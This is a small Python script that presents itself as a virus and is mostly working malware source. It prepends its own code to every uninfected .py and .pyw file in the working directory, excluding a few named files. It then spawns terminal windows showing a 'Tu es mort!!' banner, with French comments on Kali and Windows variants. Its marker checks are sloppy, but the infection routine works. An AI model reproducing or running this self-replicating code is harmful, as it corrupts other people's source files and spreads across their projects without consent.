# VIRUS SAYS HI!
import sys,glob 
import itertools,subprocess,sys,os , pyfiglet


virus_code = [] 
with open(sys.argv[0], 'r') as f: 
    lines = f.readlines()

self_replicating_part = False 
for line in lines: 
    if line == "# VIRUS SAYS HI!": 
        self_replicating_part = True 
    if not self_replicating_part: 
        virus_code.append(line) 
    if line == "# VIRUS SAYS BYE!\n": 
        break 


python_files = glob.glob('*.py') + glob.glob('*.pyw')


for file in python_files:
    if file == "main.py" or file == "virus.py" or file == "vers.py" :
        continue
    else :
        with open(file, 'r') as f: 
            file_code = f.readlines()
    
    infected = False
    for line in file_code: 
        if line == "# VIRUS SAYS HI!\n": 
            infected = True 
            break
    
    if not infected: 
        final_code = [] 
        final_code.extend(virus_code) 
        final_code.extend('\n') 
        final_code.extend(file_code)

        with open(file, 'w') as f: 
            f.writelines(final_code)


 


#ceux commmande fonctionne bien sur kali
for t in range(2): 
    command = pyfiglet.figlet_format("Tu es mort!!")
    subprocess.Popen(["qterminal",command], shell="true") 
    #subprocess.Popen("cmd", shell="true")  for windows
    #subprocess.Popen("qterminal",  shell="true") for kali linux
    [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=1)] 



# VIRUS SAYS BYE!\n